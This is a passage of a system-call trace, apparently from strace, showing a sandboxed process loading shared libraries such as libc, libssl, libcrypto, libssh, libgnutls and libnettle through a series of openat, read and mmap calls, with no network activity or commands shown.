24    10:07:56.043244 mmap(0x77bfe9e00000, 24576, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libz.so.1.3>, 0x14000) = 0x77bfe9e00000
24    10:07:56.043722 mmap(0x77bfe9e06000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libz.so.1.3>, 0x1a000) = 0x77bfe9e06000
24    10:07:56.044261 close(3</usr/lib/x86_64-linux-gnu/libz.so.1.3>) = 0
24    10:07:56.044723 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libc.so.6>
24    10:07:56.045205 read(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\220\243\2\0\0\0\0\0"..., 832) = 832
24    10:07:56.045693 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
24    10:07:56.046165 fstat(3</usr/lib/x86_64-linux-gnu/libc.so.6>, {st_mode=S_IFREG|0755, st_size=2125328, ...}) = 0
24    10:07:56.046622 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
24    10:07:56.047087 mmap(NULL, 2170256, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0) = 0x77bfe9bda000
24    10:07:56.047560 mmap(0x77bfe9c02000, 1605632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x28000) = 0x77bfe9c02000
24    10:07:56.048042 mmap(0x77bfe9d8a000, 323584, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1b0000) = 0x77bfe9d8a000
24    10:07:56.048562 mmap(0x77bfe9dd9000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1fe000) = 0x77bfe9dd9000
24    10:07:56.049051 mmap(0x77bfe9ddf000, 52624, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x77bfe9ddf000
24    10:07:56.049546 close(3</usr/lib/x86_64-linux-gnu/libc.so.6>) = 0
24    10:07:56.050076 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libnghttp2.so.14", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libnghttp2.so.14.26.0>
24    10:07:56.050638 read(3</usr/lib/x86_64-linux-gnu/libnghttp2.so.14.26.0>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    10:07:56.051116 fstat(3</usr/lib/x86_64-linux-gnu/libnghttp2.so.14.26.0>, {st_mode=S_IFREG|0644, st_size=170352, ...}) = 0
24    10:07:56.051588 mmap(NULL, 172272, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libnghttp2.so.14.26.0>, 0) = 0x77bfe9baf000
24    10:07:56.052148 mmap(0x77bfe9bb4000, 90112, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libnghttp2.so.14.26.0>, 0x5000) = 0x77bfe9bb4000
24    10:07:56.052699 mmap(0x77bfe9bca000, 49152, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libnghttp2.so.14.26.0>, 0x1b000) = 0x77bfe9bca000
24    10:07:56.053195 mmap(0x77bfe9bd6000, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libnghttp2.so.14.26.0>, 0x26000) = 0x77bfe9bd6000
24    10:07:56.053715 close(3</usr/lib/x86_64-linux-gnu/libnghttp2.so.14.26.0>) = 0
24    10:07:56.054177 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libidn2.so.0", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libidn2.so.0.4.0>
24    10:07:56.054782 read(3</usr/lib/x86_64-linux-gnu/libidn2.so.0.4.0>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    10:07:56.055522 fstat(3</usr/lib/x86_64-linux-gnu/libidn2.so.0.4.0>, {st_mode=S_IFREG|0644, st_size=133192, ...}) = 0
24    10:07:56.056089 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x77bfe9bad000
24    10:07:56.056558 mmap(NULL, 135184, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libidn2.so.0.4.0>, 0) = 0x77bfe9b8b000
24    10:07:56.057028 mmap(0x77bfe9b8d000, 16384, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libidn2.so.0.4.0>, 0x2000) = 0x77bfe9b8d000
24    10:07:56.057509 mmap(0x77bfe9b91000, 106496, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libidn2.so.0.4.0>, 0x6000) = 0x77bfe9b91000
24    10:07:56.058121 mmap(0x77bfe9bab000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libidn2.so.0.4.0>, 0x1f000) = 0x77bfe9bab000
24    10:07:56.058691 close(3</usr/lib/x86_64-linux-gnu/libidn2.so.0.4.0>) = 0
24    10:07:56.059297 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/librtmp.so.1", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/librtmp.so.1>
24    10:07:56.059947 read(3</usr/lib/x86_64-linux-gnu/librtmp.so.1>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    10:07:56.060618 fstat(3</usr/lib/x86_64-linux-gnu/librtmp.so.1>, {st_mode=S_IFREG|0644, st_size=121848, ...}) = 0
24    10:07:56.061162 mmap(NULL, 119712, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/librtmp.so.1>, 0) = 0x77bfe9b6d000
24    10:07:56.067057 mmap(0x77bfe9b72000, 69632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/librtmp.so.1>, 0x5000) = 0x77bfe9b72000
24    10:07:56.071972 mmap(0x77bfe9b83000, 24576, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/librtmp.so.1>, 0x16000) = 0x77bfe9b83000
24    10:07:56.073973 mmap(0x77bfe9b89000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/librtmp.so.1>, 0x1c000) = 0x77bfe9b89000
24    10:07:56.075609 close(3</usr/lib/x86_64-linux-gnu/librtmp.so.1>) = 0
24    10:07:56.076960 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libssh.so.4", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libssh.so.4.9.6>
24    10:07:56.078227 read(3</usr/lib/x86_64-linux-gnu/libssh.so.4.9.6>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    10:07:56.079215 fstat(3</usr/lib/x86_64-linux-gnu/libssh.so.4.9.6>, {st_mode=S_IFREG|0644, st_size=462360, ...}) = 0
24    10:07:56.079970 mmap(NULL, 464400, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libssh.so.4.9.6>, 0) = 0x77bfe9afb000
24    10:07:56.080755 mmap(0x77bfe9b09000, 294912, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libssh.so.4.9.6>, 0xe000) = 0x77bfe9b09000
24    10:07:56.081453 mmap(0x77bfe9b51000, 98304, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libssh.so.4.9.6>, 0x56000) = 0x77bfe9b51000
24    10:07:56.082331 mmap(0x77bfe9b69000, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libssh.so.4.9.6>, 0x6d000) = 0x77bfe9b69000
24    10:07:56.083212 close(3</usr/lib/x86_64-linux-gnu/libssh.so.4.9.6>) = 0
24    10:07:56.083846 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libpsl.so.5", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libpsl.so.5.3.4>
24    10:07:56.084615 read(3</usr/lib/x86_64-linux-gnu/libpsl.so.5.3.4>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    10:07:56.085327 fstat(3</usr/lib/x86_64-linux-gnu/libpsl.so.5.3.4>, {st_mode=S_IFREG|0644, st_size=75768, ...}) = 0
24    10:07:56.089179 mmap(NULL, 77840, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libpsl.so.5.3.4>, 0) = 0x77bfe9ae7000
24    10:07:56.094603 mmap(0x77bfe9ae9000, 8192, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libpsl.so.5.3.4>, 0x2000) = 0x77bfe9ae9000
24    10:07:56.097091 mmap(0x77bfe9aeb000, 57344, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libpsl.so.5.3.4>, 0x4000) = 0x77bfe9aeb000
24    10:07:56.098823 mmap(0x77bfe9af9000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libpsl.so.5.3.4>, 0x11000) = 0x77bfe9af9000
24    10:07:56.100299 close(3</usr/lib/x86_64-linux-gnu/libpsl.so.5.3.4>) = 0
24    10:07:56.101718 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libssl.so.3", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libssl.so.3>
24    10:07:56.103037 read(3</usr/lib/x86_64-linux-gnu/libssl.so.3>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    10:07:56.104179 fstat(3</usr/lib/x86_64-linux-gnu/libssl.so.3>, {st_mode=S_IFREG|0644, st_size=696512, ...}) = 0
24    10:07:56.105139 mmap(NULL, 694384, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libssl.so.3>, 0) = 0x77bfe9a3d000
24    10:07:56.105836 mmap(0x77bfe9a5b000, 401408, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libssl.so.3>, 0x1e000) = 0x77bfe9a5b000
24    10:07:56.106628 mmap(0x77bfe9abd000, 114688, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libssl.so.3>, 0x80000) = 0x77bfe9abd000
24    10:07:56.107228 mmap(0x77bfe9ad9000, 57344, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libssl.so.3>, 0x9c000) = 0x77bfe9ad9000
24    10:07:56.107863 close(3</usr/lib/x86_64-linux-gnu/libssl.so.3>) = 0
24    10:07:56.108545 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libcrypto.so.3", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libcrypto.so.3>
24    10:07:56.109259 read(3</usr/lib/x86_64-linux-gnu/libcrypto.so.3>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    10:07:56.109864 fstat(3</usr/lib/x86_64-linux-gnu/libcrypto.so.3>, {st_mode=S_IFREG|0644, st_size=5309400, ...}) = 0
24    10:07:56.110406 mmap(NULL, 5323728, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcrypto.so.3>, 0) = 0x77bfe9529000
24    10:07:56.110936 mmap(0x77bfe95dc000, 3358720, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcrypto.so.3>, 0xb3000) = 0x77bfe95dc000
24    10:07:56.111468 mmap(0x77bfe9910000, 831488, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcrypto.so.3>, 0x3e7000) = 0x77bfe9910000
24    10:07:56.112113 mmap(0x77bfe99db000, 389120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcrypto.so.3>, 0x4b1000) = 0x77bfe99db000
24    10:07:56.117570 mmap(0x77bfe9a3a000, 11216, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x77bfe9a3a000
24    10:07:56.122129 close(3</usr/lib/x86_64-linux-gnu/libcrypto.so.3>) = 0
24    10:07:56.124186 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libgssapi_krb5.so.2", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libgssapi_krb5.so.2.2>
24    10:07:56.125591 read(3</usr/lib/x86_64-linux-gnu/libgssapi_krb5.so.2.2>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    10:07:56.126883 fstat(3</usr/lib/x86_64-linux-gnu/libgssapi_krb5.so.2.2>, {st_mode=S_IFREG|0644, st_size=338696, ...}) = 0
24    10:07:56.128148 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x77bfe9527000
24    10:07:56.129308 mmap(NULL, 341080, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgssapi_krb5.so.2.2>, 0) = 0x77bfe94d3000
24    10:07:56.130320 mmap(0x77bfe94df000, 237568, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgssapi_krb5.so.2.2>, 0xc000) = 0x77bfe94df000
24    10:07:56.131206 mmap(0x77bfe9519000, 40960, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgssapi_krb5.so.2.2>, 0x46000) = 0x77bfe9519000
24    10:07:56.131939 mmap(0x77bfe9523000, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgssapi_krb5.so.2.2>, 0x4f000) = 0x77bfe9523000
24    10:07:56.132640 close(3</usr/lib/x86_64-linux-gnu/libgssapi_krb5.so.2.2>) = 0
24    10:07:56.133270 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libldap.so.2", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libldap.so.2.0.200>
24    10:07:56.134014 read(3</usr/lib/x86_64-linux-gnu/libldap.so.2.0.200>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    10:07:56.134640 fstat(3</usr/lib/x86_64-linux-gnu/libldap.so.2.0.200>, {st_mode=S_IFREG|0644, st_size=372400, ...}) = 0
24    10:07:56.135267 mmap(NULL, 383832, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libldap.so.2.0.200>, 0) = 0x77bfe9475000
24    10:07:56.138301 mmap(0x77bfe9483000, 245760, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libldap.so.2.0.200>, 0xe000) = 0x77bfe9483000
24    10:07:56.144310 mmap(0x77bfe94bf000, 61440, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libldap.so.2.0.200>, 0x4a000) = 0x77bfe94bf000
24    10:07:56.146924 mmap(0x77bfe94ce000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libldap.so.2.0.200>, 0x58000) = 0x77bfe94ce000
24    10:07:56.148627 mmap(0x77bfe94d1000, 7000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x77bfe94d1000
24    10:07:56.150226 close(3</usr/lib/x86_64-linux-gnu/libldap.so.2.0.200>) = 0
24    10:07:56.151684 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/liblber.so.2", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/liblber.so.2.0.200>
24    10:07:56.152877 read(3</usr/lib/x86_64-linux-gnu/liblber.so.2.0.200>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    10:07:56.153920 fstat(3</usr/lib/x86_64-linux-gnu/liblber.so.2.0.200>, {st_mode=S_IFREG|0644, st_size=59888, ...}) = 0
24    10:07:56.154797 mmap(NULL, 61864, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/liblber.so.2.0.200>, 0) = 0x77bfe9465000
24    10:07:56.155611 mmap(0x77bfe9468000, 32768, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/liblber.so.2.0.200>, 0x3000) = 0x77bfe9468000
24    10:07:56.156386 mmap(0x77bfe9470000, 12288, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/liblber.so.2.0.200>, 0xb000) = 0x77bfe9470000
24    10:07:56.157116 mmap(0x77bfe9473000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/liblber.so.2.0.200>, 0xd000) = 0x77bfe9473000
24    10:07:56.157830 close(3</usr/lib/x86_64-linux-gnu/liblber.so.2.0.200>) = 0
24    10:07:56.158467 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libzstd.so.1", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libzstd.so.1.5.5>
24    10:07:56.159048 read(3</usr/lib/x86_64-linux-gnu/libzstd.so.1.5.5>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    10:07:56.159705 fstat(3</usr/lib/x86_64-linux-gnu/libzstd.so.1.5.5>, {st_mode=S_IFREG|0644, st_size=755864, ...}) = 0
24    10:07:56.160382 mmap(NULL, 757816, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libzstd.so.1.5.5>, 0) = 0x77bfe93ab000
24    10:07:56.161008 mmap(0x77bfe93af000, 684032, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libzstd.so.1.5.5>, 0x4000) = 0x77bfe93af000
24    10:07:56.164022 mmap(0x77bfe9456000, 53248, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libzstd.so.1.5.5>, 0xab000) = 0x77bfe9456000
24    10:07:56.170686 mmap(0x77bfe9463000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libzstd.so.1.5.5>, 0xb7000) = 0x77bfe9463000
24    10:07:56.172843 close(3</usr/lib/x86_64-linux-gnu/libzstd.so.1.5.5>) = 0
24    10:07:56.174360 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libbrotlidec.so.1", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libbrotlidec.so.1.1.0>
24    10:07:56.175649 read(3</usr/lib/x86_64-linux-gnu/libbrotlidec.so.1.1.0>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    10:07:56.176672 fstat(3</usr/lib/x86_64-linux-gnu/libbrotlidec.so.1.1.0>, {st_mode=S_IFREG|0644, st_size=51512, ...}) = 0
24    10:07:56.177733 mmap(NULL, 53352, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libbrotlidec.so.1.1.0>, 0) = 0x77bfe939d000
24    10:07:56.178725 mmap(0x77bfe939e000, 32768, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libbrotlidec.so.1.1.0>, 0x1000) = 0x77bfe939e000
24    10:07:56.179702 mmap(0x77bfe93a6000, 12288, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libbrotlidec.so.1.1.0>, 0x9000) = 0x77bfe93a6000
24    10:07:56.180580 mmap(0x77bfe93a9000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libbrotlidec.so.1.1.0>, 0xb000) = 0x77bfe93a9000
24    10:07:56.181391 close(3</usr/lib/x86_64-linux-gnu/libbrotlidec.so.1.1.0>) = 0
24    10:07:56.182037 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libunistring.so.5", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libunistring.so.5.0.0>
24    10:07:56.182727 read(3</usr/lib/x86_64-linux-gnu/libunistring.so.5.0.0>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    10:07:56.183328 fstat(3</usr/lib/x86_64-linux-gnu/libunistring.so.5.0.0>, {st_mode=S_IFREG|0644, st_size=1755312, ...}) = 0
24    10:07:56.183926 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x77bfe939b000
24    10:07:56.184493 mmap(NULL, 1755368, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libunistring.so.5.0.0>, 0) = 0x77bfe91ee000
24    10:07:56.185045 mmap(0x77bfe91ff000, 225280, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libunistring.so.5.0.0>, 0x11000) = 0x77bfe91ff000
24    10:07:56.185590 mmap(0x77bfe9236000, 1441792, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libunistring.so.5.0.0>, 0x48000) = 0x77bfe9236000
24    10:07:56.186143 mmap(0x77bfe9396000, 20480, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libunistring.so.5.0.0>, 0x1a8000) = 0x77bfe9396000
24    10:07:56.186748 close(3</usr/lib/x86_64-linux-gnu/libunistring.so.5.0.0>) = 0
24    10:07:56.187240 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libgnutls.so.30", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libgnutls.so.30.37.1>
24    10:07:56.187766 read(3</usr/lib/x86_64-linux-gnu/libgnutls.so.30.37.1>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    10:07:56.188279 fstat(3</usr/lib/x86_64-linux-gnu/libgnutls.so.30.37.1>, {st_mode=S_IFREG|0644, st_size=2065824, ...}) = 0
24    10:07:56.188714 mmap(NULL, 2075936, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgnutls.so.30.37.1>, 0) = 0x77bfe8ff3000
24    10:07:56.189176 mmap(0x77bfe9026000, 1286144, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgnutls.so.30.37.1>, 0x33000) = 0x77bfe9026000
24    10:07:56.189682 mmap(0x77bfe9160000, 495616, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgnutls.so.30.37.1>, 0x16d000) = 0x77bfe9160000
24    10:07:56.190170 mmap(0x77bfe91d9000, 73728, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgnutls.so.30.37.1>, 0x1e6000) = 0x77bfe91d9000
24    10:07:56.190816 mmap(0x77bfe91eb000, 11552, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x77bfe91eb000
24    10:07:56.195003 close(3</usr/lib/x86_64-linux-gnu/libgnutls.so.30.37.1>) = 0
24    10:07:56.199537 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libhogweed.so.6", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libhogweed.so.6.8>
24    10:07:56.201922 read(3</usr/lib/x86_64-linux-gnu/libhogweed.so.6.8>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    10:07:56.203537 fstat(3</usr/lib/x86_64-linux-gnu/libhogweed.so.6.8>, {st_mode=S_IFREG|0644, st_size=288920, ...}) = 0
24    10:07:56.204799 mmap(NULL, 290832, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libhogweed.so.6.8>, 0) = 0x77bfe8fab000
24    10:07:56.205792 mmap(0x77bfe8fb3000, 81920, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libhogweed.so.6.8>, 0x8000) = 0x77bfe8fb3000
24    10:07:56.206814 mmap(0x77bfe8fc7000, 167936, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libhogweed.so.6.8>, 0x1c000) = 0x77bfe8fc7000
24    10:07:56.207806 mmap(0x77bfe8ff0000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libhogweed.so.6.8>, 0x44000) = 0x77bfe8ff0000
24    10:07:56.208738 close(3</usr/lib/x86_64-linux-gnu/libhogweed.so.6.8>) = 0
24    10:07:56.209557 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libnettle.so.8", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libnettle.so.8.8>
24    10:07:56.210408 read(3</usr/lib/x86_64-linux-gnu/libnettle.so.8.8>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    10:07:56.211226 fstat(3</usr/lib/x86_64-linux-gnu/libnettle.so.8.8>, {st_mode=S_IFREG|0644, st_size=342280, ...}) = 0
